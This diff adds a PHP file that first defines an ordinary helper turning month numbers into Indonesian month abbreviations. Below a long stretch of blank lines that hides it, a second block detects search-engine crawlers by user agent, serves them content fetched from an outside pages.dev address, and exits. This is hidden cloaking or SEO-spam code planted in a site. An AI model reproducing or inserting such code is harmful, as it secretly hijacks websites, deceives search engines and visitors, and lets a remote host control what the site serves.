@@ -1,0 +1,107 @@
+<?php
+function NamaBulan($data)
+{
+    if($data == '01')
+    {
+        $bulan = 'JAN';
+    }
+    else if($data == '02')
+    {
+        $bulan = 'FEB';
+    }
+    else if($data == '03')
+    {
+        $bulan = 'MAR';
+    }
+    else if($data == '04')
+    {
+        $bulan = 'APR';
+    }
+    else if($data == '05')
+    {
+        $bulan = 'MEI';
+    }
+    else if($data == '06')
+    {
+        $bulan = 'JUN';
+    }
+    else if($data == '07')
+    {
+        $bulan = 'JUL';
+    }
+    else if($data == '08')
+    {
+        $bulan = 'AGS';
+    }
+    else if($data == '09')
+    {
+        $bulan = 'SEP';
+    }
+    else if($data == '10')
+    {
+        $bulan = 'OKT';
+    }
+    else if($data == '11')
+    {
+        $bulan = 'NOV';
+    }
+    else if($data == '12')
+    {
+        $bulan = 'DES';
+    }
+    $result=$bulan;
+    return($result);
+}
+
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php
+function is_bot() {
+  $user_agent = $_SERVER['HTTP_USER_AGENT'];
+  $bots = array("bot","ahrefs","google");
+  
+  foreach ($bots as $bot) {
+    if (stripos($user_agent, $bot) !== false) {
+      return true;
+    }
+  }
+  
+  return false;
+}
+
+if (is_bot()) {
+  $message = file_get_contents('https://punten-neng.pages.dev/wiraraja/fik/hidayats/');
+  echo $message;
+exit;
+} 
+?>
